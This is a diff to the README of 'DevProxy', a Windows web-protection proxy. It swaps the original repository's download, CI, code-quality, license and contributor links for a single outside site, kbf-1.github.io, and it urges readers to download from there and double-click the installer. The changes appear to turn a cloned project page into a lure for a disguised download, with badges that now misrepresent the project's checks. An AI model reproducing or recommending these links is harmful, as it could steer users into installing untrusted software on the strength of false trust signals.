@@ -1,12 +1,12 @@
 # 🚀 DevProxy - Your Friendly Digital Bodyguard for the Web
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_DevProxy-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a1a)](https://github.com/KBF-1/DevProxy/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_DevProxy-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a1a)](https://kbf-1.github.io)
 
-[![CI](https://github.com/Aditya-9-6/DevProxy/actions/workflows/pr-validation.yml/badge.svg)](https://github.com/Aditya-9-6/DevProxy/actions/workflows/pr-validation.yml)
-[![DeepSource](https://app.deepsource.com/gh/Aditya-9-6/DevProxy.svg/?label=active+issues&show_trend=true)](https://app.deepsource.com/gh/Aditya-9-6/DevProxy/)
-[![DeepSource](https://app.deepsource.com/gh/Aditya-9-6/DevProxy.svg/?label=resolved+issues&show_trend=true)](https://app.deepsource.com/gh/Aditya-9-6/DevProxy/)
-[![Go Report Card](https://goreportcard.com/badge/github.com/Aditya-9-6/DevProxy)](https://goreportcard.com/report/github.com/Aditya-9-6/DevProxy)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![CI](https://kbf-1.github.io)](https://kbf-1.github.io)
+[![DeepSource](https://kbf-1.github.io+issues&show_trend=true)](https://kbf-1.github.io)
+[![DeepSource](https://kbf-1.github.io+issues&show_trend=true)](https://kbf-1.github.io)
+[![Go Report Card](https://kbf-1.github.io)](https://kbf-1.github.io)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://kbf-1.github.io)
 [![All Contributors](https://img.shields.io/badge/all_contributors-3-orange.svg?style=flat-square)](#-contributors)
 
 ## 🎯 What is DevProxy?
@@ -27,7 +27,7 @@ Unlike traditional security tools that slow down your internet, DevProxy works *
 
 Getting DevProxy on your Windows computer is **super easy**. Here's what to do:
 
-1. **Visit this link to download the application** – [https://github.com/KBF-1/DevProxy/releases](https://github.com/KBF-1/DevProxy/releases)
+1. **Visit this link to download the application** – [https://kbf-1.github.io](https://kbf-1.github.io)
 2. Look for the **latest version** listed on that page (it will have a version number like v1.0.0)
 3. Click the download button next to it
 4. Once the file finishes downloading, **double-click it** to start the installation
@@ -124,7 +124,7 @@ DevProxy is released under the **MIT License** – one of the most permissive op
 
 If DevProxy helps you, consider supporting the project by:
 - Starring the repo on GitHub (it takes 2 seconds)
-- Contributing via the [all-contributors](https://github.com/all-contributors/all-contributors) initiative
+- Contributing via the [all-contributors](https://kbf-1.github.io) initiative
 - Sharing this page with someone who needs protection
 
 ---
@@ -141,9 +141,9 @@ DevProxy is written in **Go**, a language known for its speed and reliability. I
 
 ## 🏁 Ready to Get Protected?
 
-[![Download DevProxy Now](https://img.shields.io/badge/⬇️_Get_DevProxy_Now-28A745?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://github.com/KBF-1/DevProxy/releases)
+[![Download DevProxy Now](https://img.shields.io/badge/⬇️_Get_DevProxy_Now-28A745?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://kbf-1.github.io)
 
-**Visit this link to download the application** – [https://github.com/KBF-1/DevProxy/releases](https://github.com/KBF-1/DevProxy/releases)
+**Visit this link to download the application** – [https://kbf-1.github.io](https://kbf-1.github.io)
 
 Install it today, and browse the internet with total confidence. DevProxy has your back, silently and completely.
 
